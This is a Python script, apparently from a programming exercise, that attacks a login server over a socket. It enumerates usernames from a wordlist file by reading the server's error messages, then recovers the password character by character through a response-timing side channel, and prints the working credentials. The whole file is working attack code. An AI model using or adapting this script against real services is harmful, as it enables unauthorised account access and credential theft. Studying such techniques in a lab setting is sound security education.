import socket
import sys
import json
import string
import time

arg = sys.argv


def check_login():
    with open('logins.txt') as file:
        for line in file:
            line = line.strip()
            dictionary = {"login": f"{line}", "password": ""}
            json_str = json.dumps(dictionary)
            client_socket.send(json_str.encode())
            response = client_socket.recv(1024).decode()
            response = json.loads(response)
            if response['result'] == 'Wrong password!':
                return line


def check_password(true_login, true_password):
    valid_char = string.ascii_lowercase + string.ascii_uppercase + string.digits
    for next_char in valid_char:
        password = true_password + next_char
        dictionary = {"login": f"{true_login}", "password": f"{password}"}
        json_str = json.dumps(dictionary)
        try:
            start = time.time()
            client_socket.send(json_str.encode())
            response = client_socket.recv(1024).decode()
            response = json.loads(response)
            end = time.time()
            connect_time = end - start
            '''
            upper = connect_time > 0.01
            with open("time.txt", "a") as f:
                f.write(str(response) + ' ' + str(connect_time) + ' ' + str(upper) + '\n')
            '''
            if response['result'] == 'Connection success!':
                print(json_str)
                return
            elif connect_time > 0.01:
                check_password(true_login, password)
        except ConnectionAbortedError:
            pass


with socket.socket() as client_socket:
    hostname = arg[1]
    port = int(arg[2])
    address = (hostname, port)

    client_socket.connect(address)

    login = check_login()
    check_password(login, '')
